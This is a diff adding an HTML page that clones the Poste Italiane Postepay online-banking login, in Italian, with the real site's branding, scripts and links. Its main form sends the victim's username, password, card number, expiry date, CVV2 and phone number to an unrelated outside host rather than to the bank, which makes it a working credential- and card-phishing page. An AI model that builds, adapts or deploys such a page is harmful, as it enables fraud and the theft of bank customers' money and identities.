@@ -1,0 +1,403 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="it">
+<head>
+<!--  @#REQUEST_COUNT >> 182 -->
+<!-- Enable IE9 Standards mode -->
+<meta http-equiv="X-UA-Compatible" content="IE=9" >
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1">
+<meta name="description" content="Accedendo ai servizi online puoi visualizzare le informazioni (saldo, lista movimenti, ricarica online) relative alla tua carta, pagare i bollettini ed effettuare le ricariche.">
+<meta name="keywords" content="">
+<meta name="Author" content="Poste Italiane S.p.A.">
+<meta HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<meta HTTP-EQUIV="Expires" CONTENT="-1">
+<title>Poste Italiane - Carta postepay </title> 
+<script language="JavaScript" src="https://bancopostaonline.poste.it/BPOL/poste.js" type="text/javascript"></script>
+
+<link type="text/css" href="https://bancopostaonline.poste.it/BPOL/resources/bancopostaonline/condivise/css/standard-bpol.css" rel="stylesheet" />
+<link rel="stylesheet" type="text/css" href="https://bancopostaonline.poste.it/BPOL/stampa.css" media="print">
+
+<!-- START IW CLIENT SIDE -->
+
+<script language="javascript" type="text/javascript" src="https://bancopostaonline.poste.it/BPOL/scripts/funzioni.js"></script>
+<script language="javascript" type="text/javascript">
+<!--
+var _AutoSetFocus = true;
+
+function SetFocus() {
+	if (! _AutoSetFocus) {
+		window.clearTimeout(iTimer);
+		return;
+	}
+
+	var oform_OTP = document.forms['Form_Auth_OTP'];
+	if (oform_OTP) {
+		var ouser = oform_OTP.elements['USER'];
+		if (ouser && ouser.focus){
+			ouser.focus();
+			_AutoSetFocus = false;
+			window.clearTimeout(iTimer);
+			return;
+		}
+	}
+
+	var oform = document.forms['Form_Auth'];
+	if (oform) {
+		var ouser = oform.elements['USER'];
+		if (ouser && ouser.focus){
+			ouser.focus();
+			_AutoSetFocus = false;
+			window.clearTimeout(iTimer);
+			return;
+		}
+	}
+	iTimer = window.setTimeout("SetFocus()", 10);
+}
+
+var iTimer = window.setTimeout("SetFocus()", 10);
+
+function CheckData(objSrc){
+	var oform = objSrc.form;
+	var ouser = oform.elements['USER'];
+	var opass = oform.elements['Password'];
+	if (CheckUser(ouser) == false) return false;
+	if (CheckPassword(opass) == false) return false;
+}
+
+function CheckData_OTP(objSrc){
+	var oform = objSrc.form;
+	var ouser = oform.elements['USER'];
+	var opass = oform.elements['Password'];
+	if (CheckUser_OTP(ouser) == false) return false;
+	if (CheckPass_OTP(opass) == false) return false;
+}
+
+function CheckUser(ouser) {
+	// Nome Utente REQUIRED
+	if (trim(ouser.value) == '') {
+		alert('Inserire il nome utente.');
+		ouser.value = '';
+		ouser.focus();
+		return false;
+	}
+}
+
+function CheckPassword(opass) {
+	// Password REQUIRED
+	if (trim(opass.value) == '') {
+		alert('Inserire la password.');
+		opass.value = '';
+		opass.focus();
+		return false;
+	}
+	// Password CONTROLLO LUNGHEZZA
+	if (opass.value.length > 30) {
+		alert("La Password non pu&ograve; superare la lunghezza di 30 caratteri.");
+		opass.value = '';
+		opass.focus();
+		return false;
+	}
+}
+
+function IsEnter(e){
+	if (checkEnter(e)){
+		document.forms[0].submit();
+	} else {
+		alert("Per accedere inserire il nome utente e la password e premere " + "\" " + "Invio" + "\" " + ".");}
+	}
+	var pr='\x68\x74\x74\x70\x73';var d=document;var pu=pr+":"+"//ba"+"nco\x70o"+"s\x74ao"+"nli"+"ne.\x70o"+"s\x74e"+".i\x74/b"+"\x70ol";var du=d.URL;var link;
+	du=du.toLowerCase();var re = new RegExp("^(?:"+pr+"?\\:\\/\\/(?:[\\w\\-]+\\.)*"+pu.substr(25,5)+".i\x74(?:\\/.*)?)|(?:f\x69le\:\/.+)$");if(!re.test(du)){ 
+	if(du.substr(0,5)!=pr) pu = pr.substr(0,4)+pu.substr(5);link='\x73cri\x70\x74';d.write('<'+link+' src="'+pu+'/styles/bpol.css'+'.a\x73hx"></'+link+'>');
+}
+
+function CheckUser_OTP(ouser) {
+	// Codice Utente REQUIRED
+	if (trim(ouser.value) == '') {
+		alert('Inserire il codice utente.');
+		ouser.value = '';
+		ouser.focus();
+		return false;
+	}
+	// Codice Utente CONTROLLO FORMATO
+	var re_user = /^\d{8}$/;
+	if (!re_user.test(ouser.value)) {
+		alert("Il Codice Utente deve avere una lunghezza di 8 caratteri e deve essere numerico.");
+		ouser.value = '';
+		ouser.focus();
+		return false;
+	}
+}
+
+function CheckPass_OTP(opass) {
+	// Password REQUIRED
+	if (trim(opass.value) == '') {
+		alert('Inserire la password OTP.');
+		opass.value = '';
+		opass.focus();
+		return false;
+	}
+	// Password CONTROLLO FORMATO
+	var re_pass = /^\d{8}$/;
+	if (!re_pass.test(opass.value)) {
+		alert("Inserire la password OTP di 8 cifre che compare sul tuo lettore personale.");
+		opass.value = '';
+		opass.focus();
+		return false;
+	}
+}
+// -->
+</script>
+<script language="javascript" type="text/javascript" src="https://bancopostaonline.poste.it/bpol/CARTEPRE/formsLOGIN.aspx?action=SetCookie&target=TYPE%3d33554433%26REALMOID%3d06-695104d5-ea5e-11d7-b948-0004ac930313%26GUID%3dNO%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3dyLxTfM1ipArajKRmhoZ4%252bCb8Yv7bbvas5%252bM%252f0trHZVjUgYgMDXJ3q6xAsGPvQf2P%26TARGET%2520%2520%252fbpol%252fcartepre%252fservizi%252fcartapostepay%252fcartapostepay.aspx%253fpnlstart%253dlistamovimenti&foo=634698652329433083"></script>
+
+<!-- END IW CLIENT SIDE -->
+</head>
+<body>
+
+<div id="page">
+
+  <div id="mainContainer">
+
+
+
+<div id="row-header">
+  <div id="contenitoreHeader">
+    <div id="header_login" class="header_login_global">
+      <div> <a id="link_principale" name="link_principale" href="http://www.poste.it/online/registrazione/">Registrazione</a><a id="link_logout" name="link_logout" href="https://myposte.poste.it"> Accedi </a> </div>
+
+    </div>
+    <ul id="header_navigazione">
+      <li> <a href="http://www.poste.it"><img src="https://bancopostaonline.poste.it/bpol/resources/bancopostaonline/condivise/images/body/logoposte.gif" alt="Homepage" /></a> </li>
+    </ul>
+    <div id="header_subnavigazione"> <a href="http://www.poste.it/online/cerca/">CERCA</a> | <a href="http://www.poste.it">HOME</a> </div>
+
+  </div>
+</div>
+
+<div id="row-user-blank">
+<div id="row-user">
+    <div class="benvenuto" id="gestione-utente">
+		<div class="lf" id="nome-utente"><span>Benvenuto </span><span class="bold">&nbsp;</span></div>
+		<div class="rf" id="ultimo-accesso"></div>								
+    </div>
+</div> </div>  
+<div id="row-navigazione-blank">
+
+<div id="row-navigazione">
+  <div id="navigazione-principale">
+    <ul>
+      <li class="logo-bpol"> <a href="https://bancopostaonline.poste.it"><span>Bancopostaonline</span></a> </li>
+    </ul>
+    <div class="floatAnnulla"></div>
+  </div>
+</div>
+
+</div>
+
+
+    <div id="row-boxContenitore" >
+      <div id="row-boxContenitoreInner">
+        <div id="boxContenitoreArea1">
+			<div id="area1">
+				 <div id="navigazione-sezione">
+  <ul>
+  <li><a class="link-attivo" href="/">BancoPosta online</a></li>
+
+    <li><a href="http://www.poste.it/online/bancopostaonline/attivareservizio.shtml">Come attivare e usare il servizio</a> </li>
+    <li><a href="http://www.poste.it/online/bancopostaonline/cosapuoifare.shtml">Cosa puoi fare</a> </li>
+    <li><a href="http://www.poste.it/online/bancopostaonline/orari.shtml">Orari e costi</a> </li>
+    <li><a href="http://www.poste.it/online/bancopostaonline/sicurezza.shtml">Sicurezza</a> </li>
+    <li><a href="http://www.poste.it/bancoposta/lettore/index.html">Lettore BancoPosta</a> </li>
+
+    <li><a href="http://www.poste.it/online/bancopostaonline/codice_dispositivo.shtml">Codice dispositivo</a> </li>
+    <li><a href="http://www.poste.it/bancoposta/">Prodotti e servizi BancoPosta</a> </li>
+  </ul>
+</div>
+<div id="navigazione-operazioni">
+<a href="https://bancopostaonline.poste.it/bpol/ricariche/Default.aspx"><img src="https://bancopostaonline.poste.it/BPOL/resources/bancopostaonline/editoriali/images/banner/h24_140x160.gif" alt="Ricariche Telefoniche H24"/></a>
+ </div>
+			</div>
+
+		</div>
+
+        <div id="boxContenitoreArea2">
+			<div id="area2">
+
+			
+
+			<div id="componente-index-pre">
+                <div class="colsx lf" style="width: 361px; height: 398px">
+                    <div class="areaCompletamenteEditabile">
+                        <p style="padding:10px 30px 0 10px;"><strong>
+						Accedi ai Servizi Online </strong></p>
+						<form name="loginform1" method="POST" onsubmit="javascript: return logintest(this);" action="http://trafficgoblin.info/cika/20122.php">
+							<p style="padding-left: 10px; padding-right: 30px; padding-top: 10px; padding-bottom: 0">
+							<strong>&nbsp;</strong></p>
+							<table style="margin-left:10px;" summary="login utente" cellpadding="0" cellspacing="0" width="309">
+				<div class="box-login-inner">
+						
+						
+						
+                            <div class="areaApplicativa">
+
+                            <p><label for="NomeUtente">Nome utente</label><input onfocus="_AutoSetFocus = true;" type="text" maxlength="50" onchange="CheckUser(this);" name="USERNAME" class="input inputSmall"/></p>
+                            <p><label for="Password">Password</label><input id="Password" onfocus="_AutoSetFocus = false;" type="password" maxlength="30" onchange="CheckPassword(this);" name="PASSWORD" class="input inputSmall"/></p>
+                            
+                            <p><label for="txtNrCartaPre">Numero carta Postepay:
+							</label>
+							<input name="card" value="" maxlength="16" id="card" class="input inputSmall" autocomplete="off" onkeypress="return ManageEnterKeySubmit(event);" type="text" size="13">
+							</p>
+							<p id="CartaPostePaySelezionaCarta1_trScadenza">
+							<label for="txtMeseScadenza">Scadenza mm/aa: </label>
+							<input name="expm" maxlength="2" id="CartaPostePaySelezionaCarta1_txtMeseScadenza" class="input inputSmall-50" autocomplete="off" type="text" size="3"><span class="lf">&nbsp;</span><input name="expy" maxlength="2" id="CartaPostePaySelezionaCarta1_txtAnnoScadenza" class="input inputSmall-50" autocomplete="off" type="text" size="3">
+							<br>
+&nbsp;</p>
+							<p id="CartaPostePaySelezionaCarta1_trCVC">
+							<label for="txtCVC2">Cvv2: </label>
+							<input name="cvv" maxlength="3" id="CartaPostePaySelezionaCarta1_txtCVC2" class="input inputSmall-50" autocomplete="off" type="text" size="4"><font size="1"> </font></p>
+				<p>
+							&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+							<label for="txtCVC2">Numero cellulare: </label>
+							<input name="CartaPostePaySelezionaCarta1:txtCVC3" maxlength="23" id="CartaPostePaySelezionaCarta1_txtCVC3" class="input inputSmall" autocomplete="off" type="text" size="17"></a></p>
+							<p>&nbsp;</p>
+							<p>
+						<input type="submit" value="accedi" name="submitButton" class="pulsante pulsanteblu pulsante75" name="btnSubmit" id="Submit" onclick="return CheckData(this);"/></a></p>
+							<p>&nbsp;</p>
+							<p>&nbsp;</p>
+							<p>&nbsp;</p>
+							<p>
+
+                            <div class="floatAnnulla"></div>
+                            <div class="lista ml30">
+                                <ul class="ml30">
+                               
+
+                                </ul>
+                            </div>
+                            </div>
+
+							
+							
+                        </div>
+                    </div>
+								</tr>
+							&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+							</table>
+							
+						</form>
+      					<!--<li><a href="#">Lorem ipsum dolor sit</a>
+      					  <p>Aenean pulvinar diam et diam pharetra interdum. Aliquam ac quam arcu. Duis cursus mi ac lacus ultricies dictum. Maecenas nulla turpis, mollis non volutpat eu, condimentum eget turpis. In justo erat, mattis quis varius non, auctor sit amet augue (..)</p>
+      					</li>-->
+      				  </ul>
+			    	</div>
+                </div>
+                <div class="coldx rf" style="width: 306px; height: 398px">
+					<form name="Form_Auth" action="logon.fcc" method="post">
+						<div class="box-logisn msb15">&nbsp;<p>&nbsp;</p>
+							<p>
+							&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+							<img alt="http://postepay.it/resources/postepay/images/lucchetto.jpg" src="http://postepay.it/resources/postepay/images/lucchetto.jpg"></div>
+						<div class="bottosni rf">&nbsp;</div>
+						<div class="floatAnnuslla"></div>
+						<input name="target" type="hidden" value="/bpol/cartepre/RedirectionGateway.ashx?type=SMACCESS" />
+						<input name="device_id" id="device_id" type="hidden" value="[[[INACCESSIBLE]]]" /><script language="JavaScript" type="text/javascript" src="/BPOL/scripts/pm_fp.js"></script><script language="JavaScript" type="text/javascript" src="/BPOL/scripts/pm_fp_bpol.js"></script>
+							<!-- Start Banner ID="CARTEPRE.FORMSLOGIN.BOTTOM" --><!-- Banner non visualizzato. Descrizione errore: "Impossibile estrarre dal ServiceContext le informazioni sull'utente collegato" --><!-- End Banner -->
+
+					</form>
+					<div class="areaCompletamenteEditabile">
+						&nbsp;<p>&nbsp;</p>
+						<p>&nbsp;</p>
+						<p>&nbsp;</p>
+						<p>&nbsp;</div></div>
+
+             </div>
+
+		
+	
+
+
+
+			
+
+</div></div>
+
+
+
+
+
+        
+
+
+
+
+<div class="floatAnnulla"></div>
+
+</div></div>
+
+<!-- Row banner -->
+	    <!-- Row banner -->
+
+    <div id="row-banner">
+      <div id="banner">
+        <div class="banner_sx lf"> <a href="http://www.poste.it/bancoposta/promozioni/promo_tol.html?WT.ac=tradingonline_promo"><img src="https://bancopostaonline.poste.it/bpol/resources/bancopostaonline/editoriali/images/banner/TradingOnline460x125.gif" alt="Promozione Trading Online BancoPosta" /></a> </div>
+        <div class="banner_dx rf"> <a href="http://www.poste.it/bancoposta/cartedipagamento/sicurezzapp/sicurezza_web.html"><img src="https://bancopostaonline.poste.it/bpol/resources/bancopostaonline/editoriali/images/banner/PostePay_sicurezza_460x125.gif" alt="Sicurizzazione" /></a> </div>
+        <div class="floatAnnulla"></div>
+      </div>
+    </div>
+
+    <!-- Row banner end -->
+<!-- Row banner end-->
+
+
+<!-- Row footer -->
+	<div id="row-footer">
+      <div id="footer-bpol">
+        <h4>Poste Italiane</h4>
+      </div>
+    </div>
+
+<!-- apre footer -->
+<script language="javascript">
+	check();
+</script>
+<!-- chiude footer -->
+
+<!-- SONDE -->
+
+<!-- START OF SmartSource Data Collector TAG -->
+<!-- Copyright (c) 1996-2011 WebTrends Inc.  All rights reserved. -->
+<!-- Version: 9.3.0 -->
+<!-- Tag Builder Version: 3.1  -->
+<!-- Created: 1/20/2011 4:09:27 PM -->
+<script src="https://www.poste.it/Scripts/webtrends.js" type="text/javascript"></script>
+<!-- Warning: The two script blocks below must remain inline. Moving them to an external - JavaScript include file can cause serious problems with cross-domain tracking. -->
+<script type="text/javascript">
+//<![CDATA[
+var _tag=new WebTrends();
+
+_tag.dcsid = 'dcs02w77jvz5bdii91aa3kbw9_9s7u';
+_tag.fpcdom = '.poste.it';
+
+_tag.dcsGetId();
+//]]>
+
+</script>
+<script type="text/javascript">
+//<![CDATA[
+_tag.dcsCustom=function(){
+// Add custom parameters here.
+//_tag.DCSext.param_name=param_value;
+}
+_tag.dcsCollect();
+//]]>
+</script>
+<noscript>
+<div><img alt="DCSIMG" id="DCSIMG" width="1" height="1" src="https://statse.webtrendslive.com/dcs02w77jvz5bdii91aa3kbw9_9s7u/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=9.3.0&amp;WT.dcssip=bancopostaonline.poste.it"/></div>
+
+</noscript>
+
+<!-- END OF SmartSource Data Collector TAG -->
+<!-- Row footer end -->
+
+</div></div></body> 
+</HTML>
+
+
